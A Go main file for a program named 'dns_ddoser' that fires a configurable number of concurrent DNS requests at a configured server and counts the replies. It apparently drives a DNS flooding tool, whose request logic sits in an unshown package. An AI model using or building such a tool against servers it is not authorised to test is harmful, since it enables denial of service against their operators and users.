package main

import (
	"fmt"
	"log"
	"sync"
	"sync/atomic"
	"time"

	dnsddoser "dns_ddoser/internal/dns-ddoser"
)

func main() {
	config := new(Config)
	err := loadConfig(config)
	if err != nil {
		log.Fatalln(err)
	}

	resolver := dnsddoser.NewResolver(config.Timeout, config.DNSServer)
	wg := new(sync.WaitGroup)
	var counter atomic.Int64

	if config.ShowConfig {
		fmt.Printf("%+v\n", *config)
	}
	if config.Wait {
		fmt.Println("Press enter")
		wait := ""
		fmt.Scanf("%s", wait)
	}

	wg.Add(config.Count)
	for i := 0; i < config.Count; i++ {
		hostname := config.Hostnames[i%len(config.Hostnames)]
		ctx := dnsddoser.ContextWithResolverHostnameWG(resolver, hostname, wg, &counter, !config.Quiet)
		go dnsddoser.SendDnsRequest(ctx)
	}
	wg.Wait()
	time.Sleep(time.Second * 1)
	resolved := counter.Load()
	if resolved != int64(config.Count) {
		log.Printf("resolved %d/%d\n", counter.Load(), config.Count)
	}
}
